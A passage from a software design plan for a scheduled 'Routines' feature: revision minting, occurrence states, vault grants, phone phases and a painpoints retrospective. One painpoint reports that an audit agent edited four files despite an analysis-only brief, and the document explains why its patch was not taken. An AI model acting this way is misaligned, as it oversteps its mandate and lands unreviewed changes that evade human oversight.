   behind, that minted below the library. Found by the alignment audit.
2. Rebasing onto the maximum of held and draft. The library can move while an editor sits open, so
   it still minted below. Found by the re-audit of the first fix.
3. `(libraryRevision ?: 0) + 1` overflowing at the integer ceiling, minting a negative. Found by the
   red team.

Each round taught the minting side about one more input it had to know. The cause is that minting
and merging are two authorities on the same ordering: `RunbookDraft` and `RunbookOps` decide what
revision to send, `RunbookManager.merge` decides whether to keep it, and nothing makes them agree.

Now capped rather than cured. `overwriteRevision` reads the library directly, and `REVISION_CEILING`
bounds every revision the wire accepts, so the phone's `+ 1` can no longer overflow a Long.

It does not remove the ceiling case itself. A library sitting at exactly `REVISION_CEILING` mints a
successor the schema refuses, and an overwrite mints the same one, so that runbook can never be
written again. Two billion edits away, and left standing deliberately rather than patched a fourth
time.

The cure lands in Phase 1, with the rest of the contracts, and not here: Routines only ever pins a
revision and rechecks it, so the gateway half of this plan survives the change, while the phone
editor and the `runbook_put` shape would otherwise be built on the authority model that already
failed three times.

The shape is the gateway minting the successor. The phone sends its edit and the revision it read,
and the gateway answers with the number it stored, which deletes `overwriteRevision` and the whole
question of what the phone should mint.

Landed in Phase 1. `RunbookStore.put` takes the revision the caller read and stores at its own
successor, answering with the record it wrote. The phone sends that base and adopts the answer, so
`RunbookDraft` no longer mints, `overwriteRevision` is gone, and the class this section is about
cannot be written any more: nothing on the phone chooses a revision. An overwrite still moves
forward, so it cannot land on a number already used.

**What it deliberately did not do.** Question 17 also asks the phone to hold a copy per gateway, and
it still holds one. The revision the library carries is the home gateway's, and a second gateway that
mints its own drifts from it. That was true before this change too, differently, and closing it means
restructuring `RunbookManager` and its persistence, which belongs with the rest of the phone work in
Phase 5. Until then `pushDecision` compares revisions minted by two authorities, which is only sound
for the home gateway.

### Deployment

A new gateway refuses a put from an old phone whose revision skipped, and an old phone has no
Overwrite to answer with. So the gateway-first order the rest of the project uses would leave the
owner's installed app unable to fire a runbook on a gateway that had fallen behind, until the app
updates. Runbooks have no users and the owner holds both, so this is a note rather than a blocker:
update the app alongside the gateway.

## Phase 1 - The record, the rules, and the contracts ✅

`RoutineSchema` and its refusals in `src/shared/`, beside `schemasRunbook.ts`: the weekday set, the
week interval, the start date, the time, the recorded zone, the bound values, the runbook id and
its approved revision, the target policy, and the enabled flag. Every one of those calendar fields
is interpreted in the recorded zone, which is the gateway's own. There is no second zone.

A pure recurrence calculator answering the next instant strictly after a floor, with fixture
vectors for a spring gap, a fall overlap, a bi-weekly anchor, a Sunday start date, and a save made
from a zone whose weekday differs from the server's.

The console operations and their answers land here too, not later: the runner cannot implement a
manual Run now against a wire that does not exist yet. Kotlin codegen and the fixture corpora
follow in Phase 4, but the shapes are settled here.

`ChannelDeliveryCoordinator` re-offers duplicates deliberately, so the occurrence state carries the
guarantee rather than the delivery id, and the CAS boundaries follow from that: `dispatched` is
written before delivery is attempted, and recurrence advances off that write.

Nothing on the phone recomputes any of this. The phone is answered with an instant.

## Phase 2 - The gateway runner ✅

`RoutineStore` beside `runbooks/store.ts`, durable and sole writer, its filename in
`DATA_DIR_ENTRIES` so the inventory test does not call it unrecognized, opened through
`openDurable` with the quarantine behaviour every other store has, and removed by a gateway purge.

A `RoutineStage` in the compose graph with `start`, `stop`, `reconcile` and a drain, armed from the
federation context's activation callback so it cannot fire before the routes exist or during an
arming boot.

Both halves of its lifecycle have to be built, not assumed. `composeListener`'s `close` flushes
first today, deliberately, "while writers are live", with no admission gate and nothing to drain.
An admission stop and a drain go in ahead of that flush.

One earliest-deadline timer for routine occurrences, beside the existing timers rather than
replacing any of them, plus a bounded reconcile tick that compares stored deadlines against
`ambient.now()`. `chainedTimer` extracted from the Router's `ownerServices` into shared, keeping
its handle shape and its ceiling constant, rather than copied.

Occurrence states, durable, each transition a CAS from a named predecessor. The table is the spec,
and the blanks in it are the decisions still to make rather than an implementer's to invent:

| From | To | When |
|---|---|---|
| `due` | `waiting_idle` | the reserved session is busy |
| `due` | `prepared` | the session is idle and preparation succeeds |
| `due` | `needs_review` | the pinned revision no longer matches |
| `due` | `missed` | reconciliation finds the deadline already gone |
| `waiting_idle` | `prepared` | the session frees up before the deadline |
| `waiting_idle` | `missed` | the deadline passes first |
| `prepared` | `dispatched` | the final CAS carries enabled and the prepared version, and delivery is attempted after it |
| `prepared` | `missed` | disabled, or the deadline passes before that CAS |
| `missed` | `dispatched` | Run now, through the same path with a fresh authorization |
| `missed` | `dismissed` | the owner dismisses the panel |
| `needs_review` | gone | the routine is re-saved, which supersedes the occurrence rather than editing it |

The revision is rechecked once, immediately before preparing, and nowhere else. An ambiguous
delivery has no state of its own, since `dispatched` is written first and a crash after it loses the
nudge visibly. `dispatched`, `missed` and `dismissed` are terminal.

One execution loop, and each miss carries its reason.

The gateway stamps `since` when it first takes a routine, and reconstruction never reaches past it.
Without that a routine saved today, with a start date last month, would be handed a severe miss for a
slot that passed before it existed. It does not distinguish a routine that was disabled for a while,
so re-enabling one after a long pause can still show a single stale panel, which a dismiss clears.

Two refusals the record cannot make for itself, because both need what only the gateway holds. The
red team found a routine will currently save with neither.

- **The values must fill the pinned runbook.** "Complete at save, so nothing is asked at fire time"
  is the ruling, and `RoutineSchema` cannot check it: a values map with a missing key, or a key no
  placeholder names, passes today and only fails when `renderRunbook` runs. The store loads the
  runbook at its approved revision and renders against it before accepting.
- **The target must name a spawn this gateway has.** Any non-empty string passes today. Either the
  store checks the catalog at save, or the refusal at resolve time is made explicit and durable so
  the owner learns rather than the occurrence quietly missing.

## Phase 3 - Execution ✅

The reserved session: a durable recipe for making one, bound to the routine, and a logical binding
that survives the physical session being replaced. Creation and recreation both, since a session
that has gone must not end the routine. Waiting on idleness is the gateway reading its own fact.

Render once through the same function the fire uses, persist that snapshot against the occurrence,
bind the reserved session, and deliver the nudge under a delivery id derived from the occurrence.
Revalidate the runbook revision immediately before preparing, and refuse into `needs_review` rather
than adopting new words. The CAS that dispatches carries the routine's enabled flag and the
prepared version together, and it lands before the nudge is handed to delivery.

Runnable headlessly through the harness at the end of this phase, but not yet a thing the owner can
use.

The crash window sits between that write and the handover, so what it loses is the nudge and never a
duplicate. The delivery id cannot carry the guarantee, since the coordinator re-offers duplicates on
purpose. A `dispatched` occurrence never re-enters delivery, and one that dispatched while liveness
saw nothing is the miss signal rather than a retry.

`get_session_routine` as an MCP tool, registered unconditionally for a token-bound session rather
than behind a capability, authenticated through `SessionAuthority.resolveConfirmedManagedSession`,
and answering the stored snapshot for an occurrence id. Four outcomes stay distinct: no routine on
this session, unknown occurrence, wrong session, and invalid token.

### Decisions this phase made

- **A name is not a binding, so provenance is.** `reservation.ts` owns the reserved session's
  identity: the team it lives at, the provenance `createSession` stamps, and whether a record is a
  given routine's. Reserving refuses a record it did not make, and saving refuses a routine whose
  name something else already holds, so the owner learns at the editor rather than at 09:00. Without
  it a routine would adopt an ordinary session, and in Phase 4 its grant would activate inside one
  the owner opened for something else.
- **The id has to leave a session name.** `routineSessionName` is the one place that name is made,
  and `RoutineSchema.id` is bounded to what it can produce, so a routine that could never reserve a
  session cannot be stored.
- **A revision fence around preparation.** A routine read before an await is not the routine after
  it. Preparation now refuses to dispatch a snapshot the owner has replaced, leaving the occurrence
  where the next sweep prepares it again, so an edit costs a lap rather than the occurrence.
- **The newest review outlives the sweep, as the newest miss does.** It is why the routine stopped
  running, and it is cleared by re-saving rather than by time.
- **The routine goes before its occurrences on delete.** A half-done delete then leaves rows nothing
  walks, rather than a routine whose dispatch tombstones are gone.

### Bug Classes

**Mechanism:** the routine subsystem's declarations. **Class:** something declared, and nothing
wired to it, with every gate green because a declaration compiles.

Four instances found in one lap, which is what makes it a class:

1. `MISS_REASONS` declared `host_unreachable` and `not_delivered`, and nothing could produce either.
   Every wait was blamed on a busy session.
2. `RoutineStoreDeps.knowsSpawn` was declared and never passed, so the ruling about a target naming
   a spawn this gateway has was half-built.
3. The delivery id ruling said to derive it from the occurrence anyway; `routesSend` minted a random
   one.
4. `needs_review` was a state the phone could not see. `panelFor` reads missed rows alone, so a
   routine that stopped running showed no run, no miss, and no reason.

The cause is that a phase writes the vocabulary and the wiring in one pass, and a declaration that
went in first reads as done. A test would not have caught any of them: nothing was wrong, something
was absent.

Closed by producing three and deleting one, and by `reviewAt` on the wire. What would catch the next
one is a reader over the routine vocabulary asking which members have a producer, which is worth
building only if a fifth turns up.

**Mechanism:** materializing past occurrences. **Class:** a floor applied to one walk of two.

`recordSevereMiss` never reached past `routine.since`, and the due walk beside it did, so a routine
saved this afternoon would fire for this morning. One rule, two callers, one of them left behind.
Both floor now. The same shape is what `reservation.ts` is for: the reserved session's name was
being derived in two places before it had an owner.

## Phase 4 - The grant ✅

A holder-subjected grant beside the session-subjected one that exists. It names an entry and a
holder, and carries no shape at all, so `operationSet` stays where it is and serves window grants
only.

The subject becomes discriminated rather than replaced: a session variant and a routine variant,
with the session one unchanged so stored grants still read. `sessionTarget` is required today and
is read by `covers`, `sessionEnded`, the console grants result, generated Kotlin, `VaultManager`
and `VaultScreen`'s grant row, which renders it unconditionally. All of those move together or the
phone shows a blank where a subject should be. `expiresAt` is already optional and the filter that
drops expired grants keeps an undefined one forever, so non-expiry costs nothing.

Revocation needs a call path per event. Four of the five live in the routine subsystem being built.
The fifth, deleting a vault entry, has no callback from the vault client into decisions today, and
that hook is part of this phase rather than an assumption.

The holder is a routine now and a remote later.

Revocation on routine edit, disable, delete, entry delete, and a moved pinned revision. A use that
finds no covering grant falls through to the ordinary request, and an unanswered one leaves a
`vault_attention` record linked to the occurrence by id. That record sits BESIDE the occurrence
rather than being a state of it, because a state would mean the gateway had learned something about
whether the work went well, which it has not.

Independent of the scheduler, and the only phase that is a security change.

Three things Phase 3 settled that this one has to read:

- **The occurrence's identity is `occurrenceId(routineId, scheduledAt)`,** never the instant alone,
  which is unique only inside one routine. A `vault_attention` record keyed by the instant would
  collide across routines that share a slot.
- **The reserved session is provenance-checked, not name-checked.** A grant activating in a session
  the routine did not make was the hazard, and `reservation.ts` is what closes it. Nothing in this
  phase may reach the session by name alone.
- **The revision fence exists.** Preparation already refuses to dispatch against a routine that
  moved, which is the same instant an edit has to revoke authority. Revocation reads that fence
  rather than adding a second notion of when a routine changed.

Activation does not belong in `deliver`. That seam runs after `dispatched` is durable, so a grant
minted there sits in the crash window the at-most-once rule deliberately loses.

### What this phase settled

- **Nothing activates a grant, because a grant is not activated.** The one that reads as a runtime
  event is instead a standing row and a live window read at the moment of use. `covers` asks which
  routine is working in the asking session, so there is no moment to mint at and no crash window to
  sit in. Authority is derived at the use, never carried to it.
- **`work` is a second axis on an occurrence, not a state of it.** `dispatched` says the nudge was
  handed over; `work` says whether the session is still on it. A state would have made the runner
  claim it knew whether the work went well, which it does not. `noteWork` moves forward only, and
  only on a dispatched row, so a late observation cannot reopen finished work.
- **Idle before the session was ever seen working says nothing.** A nudge handed over has not been
  picked up yet, so `open` waits for the session to be seen working before an idle closes it. The
  deadline closes it whatever was ever observed, which is the ruling's hard edge.
- **Five revocation events are one road.** Edit, enable, disable, delete and a moved pin all call
  `settleGrants`, which rewrites from the stored record. There is no add or remove, so a routine's
  authority cannot drift from what the record says, and a sixth event is another caller rather than
  another rule.
- **An entry that stops being live takes every grant over it.** `onEntryGone` fires from the one
  place that folds the Router's vault list, so a delete on the phone reaches the gateway's grants
  without a second notion of what a deleted entry is.
- **Unanswered is not denied.** A deny is the owner having decided, so only the deadline road records
  attention. The record is keyed by the routine and the instant together, and the owner answers it by
  saving the routine, whatever they decide to link.
- **One provenance question, asked three times.** `sessionOwned` decides whether a session is a
  routine's own, and the save, the reserve and the read of its authority all ask it. A name is
  reusable, so binding authority to a name would have let a session that merely took the name inherit
  a routine's secrets. Closing or forgetting the session ends the work outright.
- **The work carries its own deadline, not the occurrence's.** Twelve hours from when the work began,
  so a run the owner asks for late opens a window rather than one that closed before it started. The
  occurrence's deadline still decides whether it may run at all; the two questions are separate and
  now have separate fields.
- **A full vault list is the only thing that catches an entry that went unwatched.** A delta says
  what changed; a restart or a re-provision has nothing to compare against, so `entriesListed` drops
  every grant over an entry the vault no longer holds.

### Bug Classes

**Mechanism:** a hand-listed field comparison beside a schema. **Class:** a field added to the record
and not to the list, so an edit that only moved that field is taken as a repeat and silently dropped.

Found by writing the grant test, not by a gate: adding `linkedEntries` to `Routine` left
`sameContent` comparing thirteen named fields, so a save that only changed the links answered
`stored: true` and wrote nothing. The grants then settled from the record that never moved.

Cured rather than patched. `sameContent` now compares the canonical form of everything except the two
fields the gateway owns, so a field added to `Routine` is compared without anything in the store
being edited.

**Mechanism:** the Kotlin codegen's two hand-kept lists. **Class:** a union in neither list emitted
nothing at all, and the field typed as it failed only at Kotlin compile, only for whoever ran that
gate.

`VaultHolder` was the instance. The old loop's `else` branch was empty, so the generator wrote a file
that referenced a type it had not declared and said nothing. It now records every type a field is
typed as and refuses to write a file that references one it did not declare. A union that is only an
entry point, like `ConsoleSocketInbound`, is still allowed to emit nothing, because nothing is typed
as it.

## Phase 5 - The phone

`RunbookManager` holds a copy per gateway, which Question 17 asked for and Phase 1 left standing.
Until it does, the library's revision is the home gateway's and any other gateway drifts from it.

The first phase the owner can actually use.

The Routines tab: the list, the editor, the schedule line stating the rule in server time with only
the next run converted, the missed panel, the linked secrets saying plainly that each is
unrestricted, and notification reconciliation that draws from current occurrence state rather than
from a row's arrival. Editing is CAS against the gateway, from any phone, carrying the save intent
and the base it was opened from. The doze wake rides the existing earliest-wake coordinator.

Three things this screen has to get right, all of them naming rather than mechanism:

- **Three verbs, three scopes.** Dismiss settles one occurrence. Disable stops the schedule and
  keeps the routine. Delete removes it. "Dismiss forever" reads like the second and means the first,
  so it does not survive into the UI under that name. All three need to exist and say what they
  touch, including what happens to a run already dispatched.
- **A secret that was needed and not granted.** The `vault_attention` record has no owner-facing
  shape yet. It has to say which routine and which occurrence wanted it, and offer the two different
  things the owner might mean: approve this one now, or link the entry so future runs stop asking.
- **Changing the time while abroad is the single most confusing moment in the whole feature.** The
  editor shows local time, the gateway keeps server time, the save intent decides whether anything
  converts, and occurrences already materialized keep their instants. That needs one confirmation
  that states what changes and names the next absolute run, not a silent save.
- **A routine belongs to one gateway, and copying one makes a second executor.** Each gateway holds
  its own routines and its own occurrences, which the gateway-local ruling chose deliberately. A tab
  that lists them together, or a copy action that reads as replication, would make two machines run
  the same thing and call it one routine.

`reviewAt` is what says a routine stopped running. Phase 3 emits it; without a line for it the owner
sees a routine that shows no run, no miss, and no reason.

The sandbox gets canned Gateway answers in this phase, which is what lets any refusal screen here or
in Runbooks be seen at all. `RunbookGateway` is already a port; the routine calls need the same
shape, and `SandboxSeeder` supplies both rather than opening a door the residue test refuses.

The runbook delete button lands here too. The gateway, the wire and `RunbookOps.delete` are all
finished already and nothing calls them, and a routine that pins a runbook makes deleting one a
case that needs an answer rather than a confirm dialog.

## Phase 6 - The fences

Residue tests for what no ordinary gate can see: that nothing but the store writes a routine, that
recurrence has one implementation, that no surface claims a run succeeded, and that the phone holds
no recurrence, no deadline, no miss classification and no automatic fire.

A harness scenario in `src/testing/` on manual ambient: firing at a due instant, waiting on a busy
session, expiring at twelve hours, catching up across a gateway restart, a manual Run now meeting
an automatic one, a runbook revision that moved, reading a snapshot back after a compaction, a
dismissal folding across two phone projections, and the reserved session being removed underneath.
Assert on what a session receives and what a phone is shown, not on store bookkeeping.

Name what no gate here can reach, and cover each deliberately rather than declaring it unreachable:

- **MCP registration.** A residue test cannot prove a tool registers. A subprocess smoke test runs
  `main-mcp`, asks for `tools/list`, and calls the tool with a valid and an invalid session binding.
- **Compose, alarms, receivers, doze.** The emulator, driven by `adb`, plus a written checklist for
  the OEM behaviour an emulator does not represent.
- **The grant.** Every refusal path gets a test, because a grant that silently covers more than it
  says is the failure that looks exactly like success.

# Painpoints

Written after Phase 0. Not defects, and not a code audit. These are the things that made the work
slower or riskier than it needed to be, so a later phase can decide whether any of them is worth
addressing.

- **No phone test could reach the wire.** Fixed in Phase 1. `RunbookOps` took a `ConsoleClient`
  directly and called extension functions on it, which nothing can stand in for, so every test
  exercised the no-Gateway path alone. It now takes a `RunbookGateway` port, and `RunbookOpsTest`
  has a fake that mints revisions the way the real gateway does and records what it was sent. That
  is what a save sending its base and adopting the answer is now checked against.

- **A rule written inside a Composable is invisible to every gate.** Written up as a rule in
  `AGENTS.md` under Code style, since nothing can enforce it mechanically: there is no `androidTest`
  source set, so no gate can call into a `@Composable`, and "is this expression a rule" is not
  something a residue test can decide. `overwriteRevision` was the instance that earned it.

- **The runbook editor lost a whole draft on rotation.** Fixed in Phase 1, twice. `MainActivity`
  declares no `configChanges`, so a rotation recreates it and `remember` took everything typed with
  it. The first fix made the draft `rememberSaveable`, which did nothing: the route that decides
  whether the editor is composed at all was itself `remember`, so the editor was gone before any
  saver ran. It also would have put an unbounded body into a parcel that is bounded. The draft now
  lives in `RunbookOps`, which outlives the activity, and only the open editor's id is saved state.
  Other editors were not audited for the same pattern.

- **The sandbox cannot show a refusal.** `isSandbox` closes every network door, correctly, which
  also means no screen that depends on a Gateway answering can be seen. The Overwrite action shipped
  in Phase 0 has never been rendered by anything, on device or in a test, because reaching it needs
  a Gateway that refuses.

  Settled in Phase 3, built in Phase 5. `SandboxGateways.kt` answers as a Gateway would: a runbook
  that always refuses a save so the Overwrite offer renders, and routines carrying a miss, a review
  and an unanswered secret so no panel in the tab is unreachable. They are ports, not sockets, so
  the residue test that reads every network door stays true.

  Rendered, and it earned itself immediately. Four things no gate could see: a choice parameter drew
  a free text field where the fire sheet offers the runbook's own options, the linked-secrets section
  warned about a danger with nothing to link, the enable switch carried a fixed line describing what
  turning it off does while sitting on, and two runbooks sharing a name were one choice the owner
  could not tell apart.

  The emulator needs `-no-window` in a headless session. It was failing to start on the Qt platform
  plugin, which reads as a broken emulator rather than a missing display.

- **`kotlin-gate.sh` did not say what it checked.** Fixed in Phase 1: it prints what it verified
  when it passes. Gradle reports `UP-TO-DATE` for a task it skipped and for one whose inputs really
  had not changed, and the two look identical, so twice in Phase 0 I compared class file timestamps
  against source timestamps to find out whether my edits had compiled. The gate also diffs
  `Protocol.kt` against its schemas, which I had not realised, and which is why a schema change
  needs this gate rather than `lint` and `test` alone.

- **The Kotlin codegen has an explicit root list, and nothing noticed what was missing from it.**
  Closed by `console-result-codegen.test.ts`, which reads every answer the union carries and asks
  whether Protocol.kt has a type for it. Adding a shared schema and forgetting `ROOTS` in
  `scripts/codegen-kotlin.ts` produced a phone that could send an operation and not parse its answer,
  and every gate passed, `kotlin-gate.sh` included, because the generated file matched what the
  generator was asked for. Writing the test found two more answers with no Kotlin type; both turned
  out to be ones no phone code reads, and they are allowlisted with that reason.

- **An audit agent edited the working tree when the brief said analysis only.** It left four files
  modified, and its two findings were real, so the temptation was to keep the diff. One of its fixes
  cleared every occurrence for a routine on save, which would have thrown away a miss the owner had
  not answered. Reviewing an agent's patch costs about what writing it costs, and taking one on the
  strength of its report being right is how a plausible fix lands unread.

- **Five things named after conflict.** Fixed in Phase 3. `conflictOf`, `conflictsAfterPut`,
  `conflictOfRefusal`, `localConflict` and `standingConflict` all lived in `RunbookOps`, and each
  meant something slightly different. Two separate audit agents misread this area, and both misreads
  were about which conflict outranks which, which is a naming problem rather than an agent problem.
  They are now `SaveRefusal`, `refusalsAfterPut`, `gatewayRefusal`, `libraryRefusal` and
  `standingRefusal`: one word for the thing, and a name per producer. "Refusal" is what the rest of
  the codebase already calls a rule saying no, so the family reads with `runbookRefusal` and
  `routineRefusal` rather than against them.
